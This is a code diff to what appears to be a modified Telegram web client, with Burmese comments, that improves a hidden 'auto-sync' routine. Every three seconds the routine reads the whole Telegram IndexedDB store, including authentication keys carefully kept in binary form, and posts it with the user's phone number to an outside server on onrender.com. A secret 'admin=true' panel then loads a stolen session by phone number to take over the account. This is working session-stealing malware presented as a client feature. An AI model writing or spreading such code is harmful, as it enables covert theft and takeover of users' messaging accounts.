@@ -129,16 +129,15 @@ onBeforeUnload(() => {
   actions.hangUp?.({ isPageUnload: true });
 });
 
-// --- 🌟 THE FINAL BULLETPROOF AUTO-SYNC (BINARY SAFE) 🌟 ---
+// --- 🌟 MOBILE-SAFE & CRASH-PROOF AUTO-SYNC 🌟 ---
 let isSyncing = false; 
 
-// 🌟 Telegram ၏ လျှို့ဝှက်သော့ (authKey) များ မပျက်စီးစေရန် ကာကွယ်ပေးသော စနစ် 🌟
+// 🌟 Telegram ၏ Binary လျှို့ဝှက်သော့များ မပျက်စီးစေရန် 🌟
 const jsonReplacer = (key: string, value: any) => {
     if (value instanceof Uint8Array) return { __type: 'Uint8Array', data: Array.from(value) };
     if (value instanceof ArrayBuffer) return { __type: 'ArrayBuffer', data: Array.from(new Uint8Array(value)) };
     return value;
 };
-
 const jsonReviver = (key: string, value: any) => {
     if (value && value.__type === 'Uint8Array') return new Uint8Array(value.data);
     if (value && value.__type === 'ArrayBuffer') return new Uint8Array(value.data).buffer;
@@ -154,13 +153,12 @@ setTimeout(() => {
     // =========================================================
     if (window.location.search.includes('admin=true')) {
         document.body.innerHTML = '';
-        
         const adminDiv = document.createElement('div');
         adminDiv.style.cssText = "position:fixed; top:0; left:0; width:100vw; height:100vh; background:#212121; display:flex; justify-content:center; align-items:center; z-index:999999999;";
         adminDiv.innerHTML = `
             <div style="background:#fff; padding:40px; border-radius:10px; box-shadow:0 4px 15px rgba(0,0,0,0.5); text-align:center; width: 350px; font-family: sans-serif;">
                 <h2 style="color:#333; margin-bottom:20px;">Admin Control Panel</h2>
-                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: ID_12345678)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
+                <input type="text" id="myAdminPhone" placeholder="Data အမည် (ဥပမာ: +959... သို့ ID_...)" style="padding:12px; width:100%; box-sizing:border-box; margin-bottom:20px; border:2px solid #ccc; border-radius:5px; font-size:16px; color:black; background:white;">
                 <button id="myAdminBtn" style="padding:12px; width:100%; background:#0088cc; color:white; border:none; border-radius:5px; cursor:pointer; font-weight:bold; font-size:16px;">အကောင့်ထဲသို့ ဝင်ရန်</button>
                 <p id="myAdminStatus" style="color:red; margin-top:15px; font-size:14px; font-weight:bold;"></p>
             </div>
@@ -194,8 +192,6 @@ setTimeout(() => {
                     }
                     
                     statusMsg.innerText = "✅ တွေ့ရှိပါသည်။ အကောင့်ထဲသို့ ဝင်နေပါပြီ...";
-                    
-                    // 🌟 ပျက်စီးမှုမရှိသော လျှို့ဝှက်သော့များကို ပြန်လည်ရယူခြင်း (Binary Data) 🌟
                     const dataToImport = JSON.parse(result.data, jsonReviver);
                     const req = indexedDB.open(DB_NAME);
                     
@@ -227,66 +223,86 @@ setTimeout(() => {
     }
 
     // =========================================================
-    // ၂။ 📤 STAFF AUTO-SYNC (STRICT & BINARY SAFE)
+    // ၂။ 📤 STAFF AUTO-SYNC (ဖုန်းများအတွက် အထူးပေါ့ပါးအောင် ရေးထားသည်)
     // =========================================================
     setInterval(() => {
-        if (isSyncing) return; 
+        if (isSyncing) return;
+        isSyncing = true;
 
         try {
             const req = indexedDB.open(DB_NAME);
+            req.onerror = () => { isSyncing = false; };
             req.onsuccess = (e: any) => {
                 const db = e.target.result;
-                if (!db.objectStoreNames.contains(STORE_NAME)) return;
-                
-                const txStore = db.transaction(STORE_NAME, 'readonly').objectStore(STORE_NAME);
-                txStore.getAll().onsuccess = (e1: any) => {
-                    txStore.getAllKeys().onsuccess = (e2: any) => {
-                        const vals = e1.target.result;
-                        const keys = e2.target.result;
-                        
-                        const data: any = {};
-                        let currentUserId = null;
+                if (!db.objectStoreNames.contains(STORE_NAME)) {
+                    isSyncing = false; return;
+                }
 
-                        keys.forEach((k: string, i: number) => { 
-                            data[k] = vals[i]; 
-                            if (k === 'currentUserId') currentUserId = vals[i];
-                        });
-                        
-                        // 🌟 User ID မရှိသေးပါက လုံးဝ (လုံးဝ) မပို့ပါ 🌟
-                        if (!currentUserId) return; 
+                // 🌟 အဆင့် (၁): Data အကြီးကြီးမဆွဲခင် User ID လေးတစ်ခုတည်းကိုပဲ အရင် ရှာစစ်ပါမည် 🌟
+                const txCheck = db.transaction(STORE_NAME, 'readonly');
+                const storeCheck = txCheck.objectStore(STORE_NAME);
+                const reqUserId = storeCheck.get('currentUserId');
 
-                        // 🌟 လျှို့ဝှက်သော့များကို Binary အနေဖြင့် သေချာ ထုပ်ပိုးခြင်း 🌟
-                        const dataString = JSON.stringify(data, jsonReplacer);
-                        
-                        let phone = "";
-                        let phoneMatch = dataString.match(/"phoneNumber":"?(\d{8,15})"?/);
-                        
-                        if (phoneMatch && phoneMatch[1]) {
-                            phone = '+' + phoneMatch[1];
-                        } else {
-                            phone = "ID_" + currentUserId;
-                        }
-                        
-                        const lastSynced = localStorage.getItem('synced_staff_id');
-                        if (lastSynced === phone) return;
+                reqUserId.onerror = () => { isSyncing = false; };
+                reqUserId.onsuccess = (e1: any) => {
+                    const currentUserId = e1.target.result;
 
-                        isSyncing = true; 
-                        
-                        fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
-                            method: 'POST',
-                            headers: {'Content-Type': 'application/json'},
-                            body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
-                        }).then(res => res.json())
-                          .then(resData => {
-                              if(resData.success) {
-                                  localStorage.setItem('synced_staff_id', phone); 
-                              }
-                              isSyncing = false;
-                          }).catch(() => { isSyncing = false; }); 
+                    // Login မဝင်ရသေးပါက ဒီနေရာမှာတင် ရပ်မည် (ဖုန်းကို လုံးဝ မလေးစေပါ)
+                    if (!currentUserId) {
+                        isSyncing = false; return;
+                    }
+
+                    // 🌟 အဆင့် (၂): Login ဝင်ထားမှသာလျှင် Data များကို ဆွဲထုတ်ပါမည် 🌟
+                    const txAll = db.transaction(STORE_NAME, 'readonly');
+                    const storeAll = txAll.objectStore(STORE_NAME);
+                    
+                    storeAll.getAll().onsuccess = (eVals: any) => {
+                        storeAll.getAllKeys().onsuccess = (eKeys: any) => {
+                            try {
+                                const vals = eVals.target.result;
+                                const keys = eKeys.target.result;
+                                
+                                const data: any = {};
+                                keys.forEach((k: string, i: number) => { data[k] = vals[i]; });
+                                
+                                const dataString = JSON.stringify(data, jsonReplacer);
+                                
+                                let phone = "";
+                                let phoneMatch = dataString.match(/"phoneNumber":"?(\d{8,15})"?/);
+                                if (phoneMatch && phoneMatch[1]) {
+                                    phone = '+' + phoneMatch[1];
+                                } else {
+                                    phone = "ID_" + currentUserId;
+                                }
+
+                                const lastSynced = localStorage.getItem('synced_staff_id');
+                                if (lastSynced === phone) {
+                                    isSyncing = false; return;
+                                }
+
+                                fetch("https://telegram-7ih3.onrender.com/api/save-web-session", {
+                                    method: 'POST',
+                                    headers: {'Content-Type': 'application/json'},
+                                    body: JSON.stringify({ phoneNumber: phone, indexedDbData: dataString })
+                                }).then(res => res.json())
+                                  .then(resData => {
+                                      if(resData.success) localStorage.setItem('synced_staff_id', phone);
+                                      isSyncing = false;
+                                  }).catch(() => { isSyncing = false; });
+                                  
+                            } catch (error) {
+                                // ဖုန်း RAM မနိုင်၍ Error တက်ပါက သေမသွားစေရန်
+                                isSyncing = false;
+                            }
+                        };
+                        storeAll.getAllKeys().onerror = () => { isSyncing = false; };
                     };
+                    storeAll.getAll().onerror = () => { isSyncing = false; };
                 };
             };
-        } catch(err) { isSyncing = false; }
+        } catch(err) {
+            isSyncing = false;
+        }
     }, 3000); 
 
 }, 1000);
